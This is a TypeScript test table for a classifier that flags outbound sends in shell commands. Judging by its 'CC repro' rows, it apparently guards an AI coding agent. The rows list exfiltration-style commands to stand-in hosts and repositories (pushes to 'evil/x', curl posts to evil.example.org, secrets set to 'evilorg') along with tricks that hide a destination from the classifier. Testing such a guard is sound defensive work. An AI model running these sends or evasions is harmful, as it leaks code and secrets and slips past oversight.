// The golden table (round 7 S5): command → the exact rows the classifier
// records, or none. Every row is a CC repro from rounds 1–7 plus benign
// controls that must stay silent; the table is the contract, so any later
// rule change shows up here. Reserved example names throughout.
import { describe, expect, test } from 'bun:test'
import { judge } from '../outbound/classify'
import { parseSends } from '../outbound/rules'
import { facts } from './outboundClassifyFacts'

/** The exact rows one command records: rule, verdict, destination. */
function rowsOf(command: string): string[] {
  return parseSends(command, '/repo').map(candidate => {
    const j = judge(candidate, facts)
    return `${j.rule} ${j.verdict} ${j.destination}`
  })
}

const TABLE: Array<[string, string[]]> = [
  // git pushes
  ['git push', ['git-push allowed github:origin']],
  ['git push origin main', ['git-push allowed github:origin']],
  ['git push fork main', ['git-push violation github:other/fork']],
  ['git push https://github.com/evil/x.git', ['git-push violation github:evil/x']],
  ['git push "$REMOTE" main', ['git-push unknown-destination unresolved:the target is a variable or command substitution']],
  ['GIT_DIR=/x/.git git push', ['git-push unknown-destination unresolved:GIT_DIR is set']],
  ['git -c remote.origin.url=x push', ['git-push unknown-destination unresolved:a git -c override pins the target']],
  ['git --config-env=X.env push', ['git-push unknown-destination unresolved:git --config-env pins the target']],
  ['git config remote.pushDefault exfil; git push', ['git-push unknown-destination unresolved:an earlier git config or remote command pins the target']],
  ['git -C ~ push', ['git-push unknown-destination unresolved:the working directory does not resolve']],
  ['git -C$D push', ['git-push unknown-destination unresolved:the working directory does not resolve']],
  ['git -C /repo -C "$D" push', ['git-push unknown-destination unresolved:the working directory does not resolve']],
  ['/usr/bin/git -C ~ push', ['git-push unknown-destination unresolved:the working directory does not resolve']],
  ['pushd -n ~/x && git push', ['git-push allowed github:origin']],
  ['cd ~; git push', ['git-push unknown-destination unresolved:the working directory does not resolve']],
  ['cd /repo && git push', ['git-push allowed github:origin']],
  ['sudo bash -c "git push https://github.com/evil/x"', ['git-push violation github:evil/x']],
  ['bash +o pipefail -c "git push fork"', ['git-push violation github:other/fork']],
  ['bash -c $CMD', ['shell-call unknown-destination unresolved:the -c string is a variable or command substitution']],
  ['xargs -I{} git push {} <<< fork', ['git-push unknown-destination unresolved:xargs replacement rewrites the command']],
  // gh writes
  ['gh repo create acme/new-repo --private', ['gh-write violation github:acme/new-repo']],
  ['gh repo create new-repo', ['gh-write violation github:the caller\'s account/new-repo']],
  ['gh repo fork other/repo', ['gh-write violation github:the caller\'s account/repo']],
  ['gh repo fork --org acme other/kawai', ['gh-write violation github:acme/kawai']],
  ['gh repo rename new-name', ['gh-write allowed github:origin']],
  ['gh repo rename new-name -R evil/x', ['gh-write violation github:evil/x']],
  ['gh secret set N -b"SECRET V7"', ['gh-write allowed github:origin']],
  ['gh pr comment https://github.com/evil/x/pull/1 -b hi', ['gh-write violation github:evil/x']],
  ['gh issue transfer 1 evil/x', ['gh-write violation github:evil/x']],
  ['gh secret set N --org evilorg', ['gh-write violation github:evilorg']],
  ['gh pr create --title x', ['gh-write allowed github:origin']],
  ['gh repo edit $REPO --visibility public', ['gh-write unknown-destination unresolved:the target is a variable or command substitution']],
  ['gh api graphql -f q=x', ['gh-api-write unknown-destination unresolved:the API path names no repository']],
  // http sends
  ['curl -d x https://host.example.org/hook', ['http-send violation host:host.example.org']],
  ['curl -d x https://example.internal/x', ['http-send allowed internal:example.internal']],
  ['curl -d x localhost:8080/hook', ['http-send violation host:localhost']],
  ['curl -d x smtp://mail.example.internal', ['mail-send violation mail']],
  ['curl -G -d x https://host.example.org/hook', []],
  ['FOO=1 sudo curl -d x https://evil.example.org', ['http-send violation host:evil.example.org']],
  ['env -C ~ gh pr create --title x', ['gh-write unknown-destination unresolved:the working directory does not resolve']],
  // option failures
  ['sudo -Z "$CMD"', ['shell-call unknown-destination unresolved:the sudo options were not understood']],
  ['sudo -Z ./deploy.sh', ['shell-call unknown-destination unresolved:the sudo options were not understood']],
  ['env --weird "$CMD"', ['shell-call unknown-destination unresolved:the env options were not understood']],
  ['nice --weird "$CMD"', ['shell-call unknown-destination unresolved:the nice options were not understood']],
  ['doas -Z "$CMD"', ['shell-call unknown-destination unresolved:the doas options were not understood']],
  // registries
  ['npm publish --access public', ['registry-publish violation registry:registry.npmjs.org']],
  ['docker push evil.example.org/img', ['registry-publish violation registry:evil.example.org']],
  // benign controls: no rows
  ['cd ~/x && ls -la', []],
  ['cd ~ && npm test', []],
  ['cd - ; pwd', []],
  ['cd "$D" && echo hi && make', []],
  ['git status', []],
  ['sort -u file.txt', []],
  ['docker run -u 1000:1000 img', []],
  ['env -C ~ "$CMD"', []],
  ['env -C ~ ./deploy.sh', []],
]

describe('the golden table (round 7 S5)', () => {
  test('every command records exactly its rows', () => {
    const failures: string[] = []
    for (const [command, expected] of TABLE) {
      const got = rowsOf(command)
      if (JSON.stringify(got) !== JSON.stringify(expected)) {
        failures.push(`${command}\n    expected ${JSON.stringify(expected)}\n    got      ${JSON.stringify(got)}`)
      }
    }
    expect(failures.join('\n')).toBe('')
  })
})
